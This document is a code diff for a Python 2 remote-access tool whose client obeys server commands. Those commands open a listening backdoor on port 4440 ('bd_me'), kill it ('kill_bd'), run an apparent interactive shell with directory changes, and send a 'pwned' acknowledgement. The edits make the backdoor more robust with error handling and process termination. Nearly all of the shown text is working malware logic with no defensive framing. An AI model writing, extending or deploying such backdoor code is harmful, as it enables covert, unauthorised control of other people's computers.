@@ -58,16 +58,20 @@ def recover_file():
 
 # Create
 def backdoor():
+    global bd_port
     bd_host = ''
     bd_port = 4440
 
     bds = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    bdb = bds.bind((bd_host, bd_port))
+    try:
+        bdb = bds.bind((bd_host, bd_port))
+    except:
+        print "Cannot open port or Backdoor already active"
+        exit()
     bds.listen(1)
     print "Backdoor opened: Listening on port: ", bd_port
     bdcon, bdaddr = bds.accept()
     print "Server connected: ", bdaddr
-    s.send("pwned")
 
 
 def main():
@@ -81,9 +85,15 @@ def main():
         cd = split[0]
         path = split[-1]
         if srv_cmd == "quit":
-            print "[-] Interactive Mode Disabled"
+            print "[-] Interactive Mode Disabled."
         elif srv_cmd == "D1SC0NN3CT":
-            print "[-] Disconnecting from server"
+            print "[-] Disconnecting from server."
+            p.terminate()
+            s.close()
+            exit()
+        elif srv_cmd == "D1SC0NN3CT2":
+            print "[-] Disconnecting from server."
+            p.terminate()
             s.close()
             exit()
         elif srv_cmd == "rcv_cli":
@@ -93,7 +103,18 @@ def main():
         elif srv_cmd == "bd_me":
             p = multiprocessing.Process(target=backdoor)
             p.start()
-            p.join()
+            try:
+                s.send("pwned")
+            except:
+                print "Couldn't create backdoor"
+                s.send("Couldn't create backdoor")
+        elif srv_cmd == "kill_bd":
+            try:
+                p.terminate()
+                s.send("bd_killed")
+                print "Killed Process"
+            except:
+                print "Couldn't kill process"
         # Change Directory & Interactive Shell
         else:
             if cd == "cd":
